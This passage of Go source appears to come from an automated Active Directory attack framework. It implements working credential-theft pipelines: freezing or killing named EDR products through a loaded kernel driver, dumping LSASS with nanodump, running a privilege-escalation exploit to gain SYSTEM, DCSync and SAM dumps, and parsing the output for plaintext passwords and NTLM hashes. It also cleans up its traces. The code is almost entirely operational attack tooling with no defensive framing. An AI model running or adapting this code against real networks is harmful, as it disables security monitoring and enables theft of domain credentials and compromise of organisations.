			Artifact: pidCmd, Method: "command", Timeout: 30 * time.Second,
		})
		if pidR.Success && strings.TrimSpace(pidR.Output) != "" {
			pid := strings.TrimSpace(pidR.Output)
			if !isNumeric(pid) {
				fmt.Printf("[!] Invalid PID from remote: %q, skipping\n", pid)
				continue
			}
			fmt.Printf("[*] ColdWer: Found %s PID %s, freezing for 3s...\n", proc, pid)
			freezeCmd := fmt.Sprintf(`%s %s 3000`, freezerPath, pid)
			freezeR := exec.Execute(ctx, core.Action{
				Artifact: freezeCmd, Method: "command", Timeout: 30 * time.Second,
			})
			if freezeR.Success {
				time.Sleep(1 * time.Second)
				fmt.Println("[*] ColdWer: Dumping LSASS during freeze window...")
				dumpCmd := fmt.Sprintf(`%s --write %s --fork`, dumperPath, dumpRemote)
				dumpR := exec.Execute(ctx, core.Action{
					Artifact: dumpCmd, Method: "command", Timeout: 60 * time.Second,
				})
				if dumpR.Success {
					dumped = true
					break
				}
				fmt.Printf("[!] ColdWer: dump failed during %s freeze, trying next EDR\n", proc)
			}
		}
	}

	if !dumped {
		fmt.Println("[!] ColdWer: No EDR found to freeze, falling back to nanodump")
		return executeNanodumpPipeline(state, host, pipeline, exec)
	}

	localDump := filepath.Join(os.TempDir(), fmt.Sprintf("lsass_frozen_%d.dmp", time.Now().UnixNano()))
	getR := exec.Execute(ctx, core.Action{
		Artifact: dumpRemote, Method: "get",
		Arguments: []string{localDump}, Timeout: 60 * time.Second,
	})
	if getR.Success {
		fmt.Println("[*] ColdWer: Parsing dump with pypykatz...")
		pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localDump)
		if pyr.Success {
			creds := pipeline.ParseFn(pyr.Stdout)
			result.Creds = append(result.Creds, creds...)
			for _, c := range creds {
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
					Source: "coldwer", Key: c.Username + "@" + c.Domain,
					Value: c.Secret, Confidence: 0.8, RawOutput: pyr.Stdout,
					Timestamp: time.Now(),
				})
			}
		}
	} else {
		fmt.Println("[!] No frozen dump retrieved, falling back to nanodump")
		return executeNanodumpPipeline(state, host, pipeline, exec)
	}
	return result
}

func parseMimikatzOutput(output string) []core.Credential {
	var creds []core.Credential
	lines := strings.Split(output, "\n")
	var currentUser, currentDomain string

	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		lower := strings.ToLower(trimmed)

		if strings.Contains(lower, "username") && !strings.Contains(lower, "password") {
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) == 2 {
				val := strings.TrimSpace(parts[1])
				if val != "" && val != "(null)" {
					currentUser = val
				}
			}
		}
		if strings.Contains(lower, "domain") && !strings.Contains(lower, "domain sid") &&
			!strings.Contains(lower, "domain server") {
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) == 2 {
				val := strings.TrimSpace(parts[1])
				if val != "" && val != "(null)" {
					currentDomain = strings.TrimSpace(strings.Split(val, " ")[0])
				}
			}
		}
		if strings.Contains(lower, "password") && !strings.Contains(lower, "password last") &&
			!strings.Contains(lower, "password never") && !strings.Contains(lower, "password required") {
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) == 2 {
				val := strings.TrimSpace(parts[1])
				if val != "" && val != "(null)" {
					creds = append(creds, core.Credential{
						Type: core.CredPlaintext, Username: currentUser,
						Domain: currentDomain, Secret: val, Source: "go-mimikatz",
					})
				}
			}
		}
	}
	return dedupCreds(creds)
}

func parseNanodumpOutput(output string) []core.Credential {
	var creds []core.Credential
	lines := strings.Split(output, "\n")
	var currentUser, currentDomain string

	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		lower := strings.ToLower(trimmed)

		if strings.Contains(lower, "username") {
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) == 2 {
				currentUser = strings.TrimSpace(parts[1])
			}
		}
		if strings.Contains(lower, "domainname") || strings.Contains(lower, "domain name") {
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) == 2 {
				currentDomain = strings.TrimSpace(parts[1])
			}
		}
		if strings.Contains(lower, "ntlm") {
			parts := strings.SplitN(trimmed, ":", 2)
			if len(parts) == 2 {
				hash := strings.TrimSpace(parts[1])
				if len(hash) == 32 {
					creds = append(creds, core.Credential{
						Type: core.CredHash, Username: currentUser,
						Domain: currentDomain, Hash: hash, Source: "nanodump",
					})
				}
			}
		}
	}
	return dedupCreds(creds)
}

func dedupCreds(creds []core.Credential) []core.Credential {
	seen := make(map[string]bool)
	var unique []core.Credential
	for _, c := range creds {
		key := c.Domain + "\\" + c.Username + ":" + c.Secret + c.Hash
		if !seen[key] {
			seen[key] = true
			unique = append(unique, c)
		}
	}
	return unique
}

func executeSAMDump(state *core.ADState, host core.Host) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, hash := getCredential(state)
	if domain == "" || user == "" {
		result.Success = false
		return result
	}
	exec := ExecutorFactory(core.HostRef{Name: host.IP, Domain: host.Domain}, domain, user, pass, hash)
	ctx := context.Background()
	r := exec.Execute(ctx, core.Action{
		Target: core.HostRef{Name: host.IP, Domain: domain},
		Method: "smb", Artifact: "--sam", Timeout: 60 * time.Second,
	})
	if r.Success {
		result.RawOutput = r.Output
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "nxc_sam", Key: host.IP, Value: "SAM dump completed",
			Timestamp: time.Now(),
		})
		fmt.Println("[+] SAM dump successful")
	} else {
		result.Success = false
	}
	return result
}

func executeSecretsdumpPipeline(state *core.ADState, host core.Host) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, _ := getCredential(state)
	if domain == "" || user == "" {
		result.Success = false
		return result
	}

	fmt.Printf("[*] DCSync via impacket-secretsdump against %s...\n", host.IP)
	target := fmt.Sprintf("%s/%s:%s@%s", domain, user, pass, host.IP)
	args := []string{target, "-just-dc"}
	r := utils.RunCommand("impacket-secretsdump", args...)
	if r.Success {
		result.RawOutput = r.Stdout
		creds := parseSecretsdumpOutput(r.Stdout, domain)
		result.Creds = append(result.Creds, creds...)
		for _, c := range creds {
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "secretsdump", Key: c.Username + "@" + c.Domain,
				Value: c.Secret, Confidence: 0.9,
				RawOutput: r.Stdout, Timestamp: time.Now(),
			})
			if EnqueueHash != nil {
				EnqueueHash("ntlm", c.Hash, c.Username, c.Domain)
			}
		}
		fmt.Printf("[+] Secretsdump: %d credentials found\n", len(creds))
	} else {
		result.Success = false
		fmt.Printf("[!] Secretsdump failed: %s\n", r.Stderr)
	}
	return result
}

func parseSecretsdumpOutput(output, domain string) []core.Credential {
	var creds []core.Credential
	lines := strings.Split(output, "\n")
	for _, line := range lines {
		trimmed := strings.TrimSpace(line)
		if strings.Contains(trimmed, ":::") && !strings.HasPrefix(trimmed, "[") {
			parts := strings.SplitN(trimmed, ":", 4)
			if len(parts) >= 4 {
				username := parts[0]
				if strings.Contains(username, "\\") {
					parts2 := strings.SplitN(username, "\\", 2)
					username = parts2[1]
				}
				nthash := strings.TrimSpace(strings.SplitN(parts[3], ":::", 2)[0])
				if nthash != "" && !strings.Contains(nthash, " ") && len(nthash) == 32 {
					creds = append(creds, core.Credential{
						Type: core.CredHash, Username: username,
						Domain: domain, Hash: nthash, Secret: nthash,
						Source: "secretsdump",
					})
				}
			}
		}
	}
	return creds
}

func sanitizeMimikatzCommand(cmd string) string {
	var safe []rune
	for _, r := range cmd {
		if unicode.IsLetter(r) || unicode.IsDigit(r) || r == ':' || r == ' ' || r == '_' || r == '-' {
			safe = append(safe, r)
		}
	}
	return string(safe)
}

func executePhantomKillerPipeline(state *core.ADState, host core.Host, pipeline PipelineDef, exec core.Executor) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, user, pass, hash := getCredential(state)

	if domain == "" || pass == "" {
		fmt.Println("[!] No credentials for PhantomKiller pipeline")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "phantomkiller", Key: "error",
			Value:     "no credentials",
			Timestamp: time.Now(),
		})
		return result
	}

	target := tools.NetExecTarget{
		Protocol: "smb", Host: host.IP,
		Domain: domain, Username: user, Password: pass, Hash: hash,
	}

	if !tools.PhantomKiller.Available() {
		fmt.Println("[!] PhantomKiller not available, falling back to nanodump")
		return executeNanodumpPipeline(state, host, pipeline, exec)
	}

	ctx := context.Background()

	fmt.Println("[*] PhantomKiller: Deploying BootRepair.sys (randomized name)...")
	drvR := exec.Execute(ctx, core.Action{
		Artifact: "BootRepair.sys", Method: "put",
		Arguments: []string{`C:\Windows\Temp\`}, Timeout: 30 * time.Second,
	})
	if !drvR.Success {
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "phantomkiller", Key: "error",
			Value:     "driver upload failed: " + drvR.Error,
			Timestamp: time.Now(),
		})
		return result
	}
	driverPath := drvR.Output

	fmt.Println("[*] PhantomKiller: Deploying PhantomKiller.exe (randomized name)...")
	klrR := exec.Execute(ctx, core.Action{
		Artifact: "PhantomKiller.exe", Method: "put",
		Arguments: []string{`C:\Windows\Temp\`}, Timeout: 30 * time.Second,
	})
	if !klrR.Success {
		exec.Execute(ctx, core.Action{
			Method: "cleanup", Arguments: []string{driverPath}, Timeout: 15 * time.Second,
		})
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "phantomkiller", Key: "error",
			Value:     "killer upload failed: " + klrR.Error,
			Timestamp: time.Now(),
		})
		return result
	}
	killerPath := klrR.Output

	defer func() {
		exec.Execute(ctx, core.Action{
			Artifact: `sc.exe stop PhantomKiller`, Method: "command", Timeout: 15 * time.Second,
		})
		time.Sleep(2 * time.Second)
		exec.Execute(ctx, core.Action{
			Artifact: `sc.exe delete PhantomKiller`, Method: "command", Timeout: 15 * time.Second,
		})
		exec.Execute(ctx, core.Action{
			Method: "cleanup", Arguments: []string{driverPath, killerPath},
			Timeout: 30 * time.Second,
		})
	}()

	fmt.Println("[*] PhantomKiller: Loading kernel driver...")
	loadCmd := fmt.Sprintf(`sc.exe create PhantomKiller binPath="%s" type=kernel && sc.exe start PhantomKiller`, driverPath)
	loadR := exec.Execute(ctx, core.Action{
		Artifact: loadCmd, Method: "command", Timeout: 30 * time.Second,
	})
	if !loadR.Success {
		fmt.Println("[!] Failed to load PhantomKiller driver")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "phantomkiller", Key: "error",
			Value:     "failed to load driver",
			Timestamp: time.Now(),
		})
		return result
	}

	fmt.Println("[*] PhantomKiller: Enumerating EDR processes...")
	edrProcs := []string{"MsMpEng.exe", "CSFalconService.exe", "SentinelService.exe", "CylanceSvc.exe",
		"SophosMgr.exe", "TaniumClient.exe", "CarbonBlack.exe", "CrowdStrike.exe", "McAfee.exe", "Symantec.exe"}
	for _, proc := range edrProcs {
		pidCmd := fmt.Sprintf(`powershell -c "(Get-Process %s -ErrorAction SilentlyContinue).Id"`, proc)
		pidR := exec.Execute(ctx, core.Action{
			Artifact: pidCmd, Method: "command", Timeout: 30 * time.Second,
		})
		if pidR.Success && strings.TrimSpace(pidR.Output) != "" {
			pid := strings.TrimSpace(pidR.Output)
			if !isNumeric(pid) {
				fmt.Printf("[!] PhantomKiller: Invalid PID from remote: %q, skipping\n", pid)
				continue
			}
			fmt.Printf("[*] PhantomKiller: Found %s PID %s, killing via IOCTL...\n", proc, pid)
			pidInt := 0
			fmt.Sscanf(pid, "%d", &pidInt)
			if pidInt > 0 {
				tools.PhantomKiller.ExecRemote(ctx, target, killerPath, tools.PhantomKillerModeKill, pidInt)
			}
		}
	}

	fmt.Println("[*] PhantomKiller: Dumping LSASS with nanodump...")
	dump := executeNanodumpPipeline(state, host, pipeline, exec)
	result.Success = dump.Success
	result.Evidence = append(result.Evidence, dump.Evidence...)
	result.Creds = append(result.Creds, dump.Creds...)

	return result
}

func executeMiniPlasmaPipeline(state *core.ADState, host core.Host, pipeline PipelineDef, exec core.Executor) *core.ToolResult {
	result := &core.ToolResult{Success: true}
	domain, _, pass, _ := getCredential(state)

	if domain == "" || pass == "" {
		fmt.Println("[!] No credentials for MiniPlasma pipeline")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "miniplasma", Key: "error",
			Value:     "no credentials",
			Timestamp: time.Now(),
		})
		return result
	}

	if !tools.MiniPlasma.Available() {
		fmt.Println("[!] MiniPlasma not available, falling back to nanodump")
		return executeNanodumpPipeline(state, host, pipeline, exec)
	}

	ctx := context.Background()

	fmt.Println("[*] MiniPlasma: Deploying dependency DLLs (NtApiDotNet + TaskScheduler)...")
	var depPaths []string
	for _, lib := range []string{"NtApiDotNet.dll", "Microsoft.Win32.TaskScheduler.dll"} {
		depR := exec.Execute(ctx, core.Action{
			Artifact: lib, Method: "put",
			Arguments: []string{`C:\Windows\Temp\`}, Timeout: 30 * time.Second,
		})
		if !depR.Success {
			exec.Execute(ctx, core.Action{
				Method: "cleanup", Arguments: depPaths, Timeout: 15 * time.Second,
			})
			result.Success = false
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "miniplasma", Key: "deploy_error",
				Value:     lib + " deploy failed: " + depR.Error,
				Timestamp: time.Now(),
			})
			return result
		}
		depPaths = append(depPaths, depR.Output)
	}

	fmt.Println("[*] MiniPlasma: Deploying MiniPlasma.exe (randomized name)...")
	expR := exec.Execute(ctx, core.Action{
		Artifact: "MiniPlasma.exe", Method: "put",
		Arguments: []string{`C:\Windows\Temp\`}, Timeout: 30 * time.Second,
	})
	if !expR.Success {
		exec.Execute(ctx, core.Action{
			Method: "cleanup", Arguments: depPaths, Timeout: 15 * time.Second,
		})
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "miniplasma", Key: "error",
			Value:     "exploit upload failed: " + expR.Error,
			Timestamp: time.Now(),
		})
		return result
	}
	exploitPath := expR.Output

	fmt.Println("[*] MiniPlasma: Deploying nanodump.exe (randomized name)...")
	dmpR := exec.Execute(ctx, core.Action{
		Artifact: "nanodump.exe", Method: "put",
		Arguments: []string{`C:\Windows\Temp\`}, Timeout: 30 * time.Second,
	})
	if !dmpR.Success {
		allPaths := append(depPaths, exploitPath)
		exec.Execute(ctx, core.Action{
			Method: "cleanup", Arguments: allPaths, Timeout: 30 * time.Second,
		})
		return executeNanodumpPipeline(state, host, pipeline, exec)
	}
	dumperPath := dmpR.Output

	dumpRemote := fmt.Sprintf(`C:\Windows\Temp\lsass_eop_%d.dmp`, time.Now().UnixNano())
	allPaths := append(append(depPaths, exploitPath, dumperPath), dumpRemote)
	defer func() {
		exec.Execute(ctx, core.Action{
			Method: "cleanup", Arguments: allPaths, Timeout: 30 * time.Second,
		})
	}()

	fmt.Println("[*] MiniPlasma: Executing Cloud Filter EoP exploit (run)...")
	execR := exec.Execute(ctx, core.Action{
		Artifact: exploitPath, Method: "run", Timeout: 60 * time.Second,
	})
	if !execR.Success {
		fmt.Println("[!] MiniPlasma exploit did not return success")
		result.Success = false
		return result
	}

	fmt.Println("[+] MiniPlasma: SYSTEM shell obtained, dumping LSASS as SYSTEM via schtasks...")
	dumpCmd := fmt.Sprintf(
		`schtasks /create /tn "MiniDump" /tr "%s --write %s --fork" /sc once /st 00:00 /ru SYSTEM /f && schtasks /run /tn "MiniDump" && ping -n 6 127.0.0.1 >NUL && schtasks /delete /tn "MiniDump" /f`,
		dumperPath, dumpRemote)
	execDumpR := exec.Execute(ctx, core.Action{
		Artifact: dumpCmd, Method: "command", Timeout: 90 * time.Second,
	})
	if !execDumpR.Success {
		fmt.Printf("[!] MiniPlasma: schtasks dump failed (err=%s)\n", execDumpR.Error)
		result.Success = false
		return result
	}

	fmt.Println("[*] MiniPlasma: Retrieving SYSTEM-level dump via SMB...")
	localDump := fmt.Sprintf("/tmp/lsass_eop_%d.dmp", time.Now().UnixNano())
	getR := exec.Execute(ctx, core.Action{
		Artifact: dumpRemote, Method: "get",
		Arguments: []string{localDump}, Timeout: 60 * time.Second,
	})
	if getR.Success {
		fmt.Println("[*] MiniPlasma: Parsing dump with pypykatz...")
		pyr := utils.RunCommand("pypykatz", "lsa", "minidump", localDump)
		if pyr.Success {
			creds := pipeline.ParseFn(pyr.Stdout)
			result.Creds = append(result.Creds, creds...)
			for _, c := range creds {
				result.Evidence = append(result.Evidence, core.EvidenceEntry{
					Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
					Source: "miniplasma", Key: c.Username + "@" + c.Domain,
					Value: c.Secret, Confidence: 0.8, RawOutput: pyr.Stdout,
					Timestamp: time.Now(),
				})
			}
		}
	}

	result.Evidence = append(result.Evidence, core.EvidenceEntry{
		Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
		Source: "miniplasma", Key: "eop",
		Value:      "MiniPlasma SYSTEM shell achieved",
		Confidence: 0.7, RawOutput: execR.Output,
		Timestamp: time.Now(),
	})
	return result
}

func executeDCSyncPipeline(state *core.ADState, _ core.Host, _ PipelineDef, _ core.Executor) *core.ToolResult {
	result := &core.ToolResult{Success: true}

	if !tools.GoMimikatz.Available() {
		fmt.Println("[!] go-mimikatz not available for DCSync")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "dcsync", Key: "error", Value: "go-mimikatz not available",
			Timestamp: time.Now(),
		})
		return result
	}

	ctx := context.Background()
	synced := 0
	for _, c := range state.Creds {
		if !c.Validated {
			continue
		}
		isDA := false
		for _, u := range state.Users {
			if u.Username == c.Username && u.Domain == c.Domain && u.IsDA {
				isDA = true
				break
			}
		}
		if !isDA {
			continue
		}

		fmt.Printf("[*] DCSync for %s\\%s...\n", c.Domain, c.Username)
		req := tools.ExecutionRequest{
			Env: map[string]string{
				"DOMAIN": c.Domain,
				"USER":   c.Username,
			},
		}
		r, err := tools.GoMimikatz.SekurlsaDcsync(ctx, req)
		if err != nil {
			fmt.Printf("[!] DCSync failed for %s\\%s: %v\n", c.Domain, c.Username, err)
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "dcsync", Key: c.Username + "@" + c.Domain,
				Value: "DCSync failed: " + err.Error(), Confidence: 0.5,
				Timestamp: time.Now(),
			})
			continue
		}
		if r == nil || !r.Success {
			fmt.Printf("[!] DCSync failed for %s\\%s: result unsuccessful\n", c.Domain, c.Username)
			rawOut := ""
			if r != nil {
				rawOut = r.Stdout
			}
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "dcsync", Key: c.Username + "@" + c.Domain,
				Value: "DCSync failed", Confidence: 0.5, RawOutput: rawOut,
				Timestamp: time.Now(),
			})
			continue
		}

		creds := parseMimikatzOutput(r.Stdout)
		result.Creds = append(result.Creds, creds...)
		for _, dc := range creds {
			result.Evidence = append(result.Evidence, core.EvidenceEntry{
				Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
				Source: "dcsync", Key: dc.Username + "@" + dc.Domain,
				Value: dc.Secret, Confidence: 0.9, RawOutput: r.Stdout,
				Timestamp: time.Now(),
			})
		}
		synced++
	}

	if synced == 0 {
		fmt.Println("[!] No DA credentials with validated creds found for DCSync")
		result.Success = false
		result.Evidence = append(result.Evidence, core.EvidenceEntry{
			Type: core.EvCredAcquired, Phase: core.PhaseCredentialAcq,
			Source: "dcsync", Key: "status", Value: "no DA creds available",
			Timestamp: time.Now(),
		})
	}

	fmt.Printf("[*] DCSync complete: %d DA credentials synced\n", synced)
	return result
}

func isNumeric(s string) bool {
	for _, r := range s {
		if !unicode.IsDigit(r) {
			return false
		}
	}
	return s != ""
}
